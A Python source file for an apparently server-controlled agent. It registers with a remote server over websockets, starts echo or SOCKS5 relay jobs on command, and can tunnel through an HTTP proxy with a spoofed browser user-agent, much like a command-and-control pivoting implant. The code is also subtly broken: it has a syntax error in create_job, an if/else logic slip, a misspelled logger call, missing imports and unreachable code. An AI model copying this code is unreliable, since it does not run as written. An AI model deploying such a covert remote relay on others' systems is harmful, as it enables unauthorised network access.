import asyncio
from datetime import datetime
import uuid
from urllib.parse import *

from .comms import *
from . import logger
from .modules.echo import EchoModule
from .modules.socks5 import Socks5Module
from .tcp_proxy import *

import websockets


class CommsAgentClient:
	def __init__(self, client_uuid, in_queue, out_queue):
		self.client_uuid = client_uuid
		self.connected_at = datetime.utcnow()
		self.last_seen_at = None
		
		self.in_queue = in_queue
		self.out_queue = out_queue

		self.modules = {} #jobid -> job_in_queue
		self.modules_cmd_queue = asyncio.Queue()
		self.modules_ctr = Counter()
		self.name = '[CommsAgentClient]'

	async def create_job(self, module_name):
		logger.debug('%s Creating job %s' % (self.name, module_name))
		try:
			if module_name == 'echo':
				job_id = self.modules_ctr.get_next()
				in_queue = asyncio.Queue()
				em = EchoModule(job_id, in_queue, self.modules_cmd_queue)
				asyncio.ensure_future(em.run())

				self.modules[job_id] = in_queue

				rply = CreateJobRply()
				rply.job_name = module_name
				rply.job_id = job_id
				await self.modules_cmd_queue.put(rply)

			if module_name == 'socks5':
				job_id = self.modules_ctr.get_next()
				in_queue = asyncio.Queue()
				em = Socks5Module(job_id, in_queue, self.modules_cmd_queue)
				asyncio.ensure_future(em.run())

				self.modules[job_id] = in_queue

				rply = CreateJobRply()
				rply.job_name = module_name
				rply.job_id = job_id
				await self.modules_cmd_queue.put(rply)

			else:
				logger.warning('%s Unknown job to create! %s' % (self.name , module_name))
				return 


		except Exception as e:
			logger.exception('%s create_job' %s (self.name,))

	async def listen_server_cmds(self):
		try:
			while True:
				cmd = await self.in_queue.get()
				if isinstance(cmd, JobCmd):
					if cmd.job_id in self.modules:
						await self.modules[cmd.job_id].put(cmd.job_data)
					else:
						logger.warning('%s Reply to an unknown job id!' % (self.name, cmd.job_id))
			
				elif isinstance(cmd, CreateJobCmd):
					logger.debug('Got command!')
					await self.create_job(cmd.job_name)
			
				elif isinstance(cmd, StopJobCmd):
					pass
		except Exception as e:
			logger.exception('%s listen_server_cmds' % (self.name,))

	async def listen_module_rplys(self):
		try:
			while True:
				rply = await self.modules_cmd_queue.get()
				rply.client_uuid = self.client_uuid
				await self.out_queue.put(rply)
		except Exception as e:
			logger.exception('%s listen_module_rplys' % (self.name,))

	async def run(self):
		try:
			asyncio.ensure_future(self.listen_server_cmds())
			t = await asyncio.wait_for(self.listen_module_rplys(), timeout = None)
			logger.info('%s Client exiting'% (self.name,))
			
		except Exception as e:
			logger.exception('run')

class FakeHTTPProxy:
	def __init__(self, proxy_url, destination, listen_ip = '127.0.0.1', listen_port = 10001):
		self.listen_ip = listen_ip
		self.listen_port = listen_port
		self.proxy_url = proxy_url
		self.destination = destination

		p = urlparse(self.proxy_url)
		self.username = p.username
		self.password = p.password
		self.proxy_ip, self.proxy_port = p.netloc.split(':')
		self.proxy_port = int(self.proxy_port)

	async def open_proxy_connection(self, reader, writer):
		try:
			connect_hdr = [
				'CONNECT %s HTTP/1.1' % self.destination,
				'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
				'Proxy-Connection: keep-alive',
				'Connection: keep-alive',
				'Host: %s' % self.destination,
			]
			if self.username and self.password:
				adata = '%s:%s' % (self.username, self.password)
				adata = base64.b64encode(adata.encode())
				connect_hdr.append('Proxy-Authorization: basic %s' % adata)
				#'Proxy-Authorization: basic aGVsbG86d29ybGQ=',
			connect_cmd = '\r\n'.join(connect_hdr) + '\r\n\r\n'
			logger.debug('Connect cmd: %s' % repr(connect_cmd))
			writer.write(connect_cmd.encode())
			await writer.drain()
			response = ''
			
			line = await reader.readuntil(b'\r\n\r\n')
			response = line.decode()

			logger.debug('Response from proxy server: %s' % response)
			status_code = response.split('\r\n')[0].split(' ')[1]
			if status_code != '200':
				logger.warining('Proxy server doesnt like us! Status code: %s' % status_code)
				return 'NO'

			logger.debug('HTTP proxy channel is open!')
			return 'OK'
		except Exception as e:
			logger.exception('open_proxy_connection')
			return 'NO'

	

	async def handle_client(self, reader, writer):
		proxy_reader, proxy_writer = await asyncio.wait_for(asyncio.open_connection(host=self.proxy_ip, port = self.proxy_port), timeout=10)
		status = await self.open_proxy_connection(proxy_reader, proxy_writer)
		if status == 'NO':
			writer.close()
			return

		tcp_proxy = AioTCPProxy(proxy_reader, proxy_writer, reader, writer, '[FakeHTTPProxy Proxy]', logger, timeout = None)
		asyncio.ensure_future(tcp_proxy.run())



	async def run(self):
		server = await asyncio.start_server(self.handle_client, self.listen_ip, self.listen_port)
		async with server:
			await server.serve_forever()


class CommsAgentServer:
	def __init__(self, url, proxy = None, proxy_listen_ip = None, proxy_listen_port = None):
		self.url = url
		self.uuid = None
		self.proxy = proxy
		self.proxy_listen_ip = proxy_listen_ip
		self.proxy_listen_port = proxy_listen_port

		self.proxy_server = None
		self.name = '[CommsAgentServer]'

		if self.proxy:
			proxy_url = urlparse(self.proxy)
			dest_url = urlparse(self.url)
			destination = dest_url.netloc
			url = list(urlsplit(self.url))
			url[1] = '%s:%d' % (self.proxy_listen_ip, self.proxy_listen_port)
			self.url = urlunsplit(url)
			logger.debug('Original destination rewritten to connect to proxy! Final url: %s' % self.url)
			self.proxy_server = FakeHTTPProxy(self.proxy, destination, self.proxy_listen_ip, self.proxy_listen_port)

	async def register(self, ws):
		msg = await ws.recv()
		cc = ClientCmd.from_msg(msg)
		logger.debug('CMD recieved! %s' % str(type(cc)))

		client_uuid = cc.cmd.client_uuid
		rply = RegisterRply()
		rply.client_uuid = client_uuid
		msg = ClientRply()
		msg.uuid = cc.uuid
		msg.rply = rply
		data = msg.to_msg()

		await ws.send(data)
		client_in_queue = asyncio.Queue()
		client_out_queue = asyncio.Queue()
		return CommsAgentClient(client_uuid, client_in_queue, client_out_queue)

		logger.debug('%s Registration succseeded! Got UUID: %s' % (self.name, client_uuid))
	
	async def handle_client_out(self, ws, client):
		while True:
			rply = await client.out_queue.get()
			msg = ClientRply()
			msg.uuid = str(uuid.uuid4())
			msg.rply = rply
			data = msg.to_msg()
			logger.debug('%s Sending data to server: %s' % (self.name, data))
			await ws.send(data)

	async def handle_client_in(self, ws, client):
		while True:
			msg = await ws.recv()
			logger.debug('%s Got command from server: %s' % (self.name, msg))
			cr = ClientCmd.from_msg(msg)
			cmd_uuid = cr.uuid
			await client.in_queue.put(cr.cmd)

	async def run(self):
		try:
			if self.proxy_server:
				asyncio.ensure_future(self.proxy_server.run())

			async with websockets.connect(self.url) as ws:
				client = await self.register(ws)
				asyncio.ensure_future(self.handle_client_in(ws, client))
				asyncio.ensure_future(self.handle_client_out(ws, client))
				await client.run()
			
		except Exception as e:
			logger.exception('Error in main loop!')
			return